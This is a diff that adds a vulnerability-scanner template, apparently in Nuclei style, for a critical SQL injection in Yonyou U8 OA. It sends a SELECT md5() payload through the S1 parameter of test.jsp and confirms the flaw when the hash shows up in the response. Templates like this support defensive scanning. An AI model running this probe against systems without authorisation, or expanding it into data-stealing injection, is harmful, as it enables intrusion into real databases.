@@ -1,0 +1,25 @@
+id: yonyou-u8-oa-sqli
+brief:
+    title: Yonyou U8 - SQL Injection
+    by: ritikchaddha
+    level: critical
+    about: Yonyou U8 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the conte...
+    label:
+        - yonyou
+        - oa
+        - sqli
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{num}}))'
+      signs:
+        - "on": word
+          has:
+            - '{{md5({{num}})}}'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
